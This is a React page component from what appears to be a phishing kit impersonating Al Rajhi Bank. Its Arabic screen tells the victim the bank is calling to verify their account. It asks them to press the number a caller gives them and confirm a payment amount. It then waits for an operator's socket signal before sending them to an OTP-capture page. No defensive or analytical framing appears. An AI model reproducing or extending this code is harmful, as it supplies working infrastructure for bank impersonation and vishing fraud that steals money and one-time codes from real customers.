import React, { useEffect, useMemo, useState } from "react";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { useNavigate } from "react-router-dom";
import {
  FaMicrophone,
  FaPhoneSlash,
  FaVolumeHigh,
  FaGrip,
  FaLock,
} from "react-icons/fa6";
import { api_route, socket } from "../App";
import { useSocketEvent } from "../hooks/useSocketEvent";

const RajhiCallWaiting = () => {
  const navigate = useNavigate();
  const search = window.location.search;
  const data = useMemo(() => {
    try {
      const raw = new URLSearchParams(search).get("data");
      if (!raw) return null;
      return JSON.parse(raw);
    } catch {
      return null;
    }
  }, [search]);

  const _id = data?._id || sessionStorage.getItem("id");
  const amount = useMemo(() => {
    try {
      const stored = sessionStorage.getItem("companyData");
      const company = stored ? JSON.parse(stored) : null;
      return (
        parseFloat(String(company?.price ?? "").replace(/[^\d.]/g, "")) || 100
      );
    } catch {
      return 100;
    }
  }, []);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const handleConfirm = async () => {
    if (!_id) return;
    setLoading(true);
    setError(false);
    try {
      await axios.post(`${api_route}/rajhiCallConfirm/${_id}`, {
        rajhiCallConfirm: true,
      });
      socket.emit("rajhiCallConfirm", { _id, id: _id });
    } catch {
      setLoading(false);
    }
  };

  useSocketEvent("acceptRajhiCallConfirm", (id) => {
    if (id !== _id) return;
    setLoading(false);
    navigate(
      `/rajhi-otp?data=${encodeURIComponent(JSON.stringify({ ...data, _id }))}`,
    );
  });

  useSocketEvent("declineRajhiCallConfirm", (id) => {
    if (id !== _id) return;
    setLoading(false);
    setError(true);
  });

  return (
    <div
      className="min-h-screen w-full max-w-md mx-auto bg-white flex flex-col px-4 py-6"
      dir="rtl"
    >
      {loading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30">
          <div className="flex flex-col items-center gap-4 bg-white p-8 rounded-md shadow-lg">
            <TailSpin
              height="40"
              width="40"
              color="#1e3a8a"
              ariaLabel="loading"
            />
            <span className="text-gray-700 font-medium">جاري التحقق...</span>
          </div>
        </div>
      )}

      <div className="flex flex-col items-center text-center mb-4">
        <div className="w-14 h-14 rounded-full bg-[#2563eb] flex items-center justify-center mb-4">
          <svg width="28" height="28" viewBox="0 0 24 24" fill="white">
            <path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1-.2 1.1.4 2.3.6 3.6.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1-9.4 0-17-7.6-17-17 0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.3.2 2.5.6 3.6.1.3 0 .7-.2 1L6.6 10.8z" />
          </svg>
        </div>
        <h1 className="text-xl font-bold text-[#1e3a8a] mb-1">
          جاري الاتصال بك من البنك
        </h1>
        <p className="text-sm text-gray-500 mb-2">لتأكيد بياناتك</p>
        <div className="w-10 h-0.5 bg-[#2563eb] rounded-full" />
      </div>

      <div className="bg-white border border-gray-200 rounded-2xl p-5 shadow-sm mt-2">
        <div className="flex gap-3 items-center mb-5">
          <svg
            width="40"
            height="40"
            viewBox="0 0 28 28"
            fill="none"
            className="shrink-0"
          >
            <path
              d="M14 2L4 6v7c0 6.6 4.3 12.7 10 14.4 5.7-1.7 10-7.8 10-14.4V6L14 2z"
              stroke="#2563eb"
              strokeWidth="1.75"
              strokeLinejoin="round"
            />
            <path
              d="M11 14l2 2 4-4"
              stroke="#2563eb"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
            />
          </svg>
          <div className="text-sm text-gray-700 leading-relaxed text-center">
            <p>الرجاء الضغط على الرقم المذكور من الموظف</p>
            <p>لتأكيد توثيق حسابك البنكي</p>
            <p className="flex items-center gap-2  mt-1 text-center justify-center">
              <span>وتأكيد دفع مبلغ</span>
              <span className="bg-[#2563eb] text-white text-xs font-bold px-3 py-1 rounded-full">
                {amount} ريال
              </span>
            </p>
          </div>
        </div>

        {error && (
          <p className="text-red-600 text-sm text-center mb-4 leading-relaxed">
            لم يتم التوثيق جاري الاتصال مره اخرى لتأكيد توثيق بيانات الدفع
          </p>
        )}

        <button
          type="button"
          onClick={handleConfirm}
          className="w-full bg-[#2563eb] hover:bg-[#1d4ed8] text-white font-bold py-4 rounded-xl text-base transition-colors"
        >
          تأكيد التوثيق
        </button>
      </div>
      <div>
        <img src="/rajhi_call.jpeg" alt="Rajhi Call" className="w-full" />
      </div>

      <div className="flex flex-col items-center gap-2 mt-6 mb-4">
        <FaLock className="text-[#2563eb] text-sm" />
        <p className="text-xs text-gray-500 text-center leading-relaxed px-4">
          لأمانك، لا تشارك أي بيانات أو رموز مع أي شخص
        </p>
      </div>
    </div>
  );
};

export default RajhiCallWaiting;
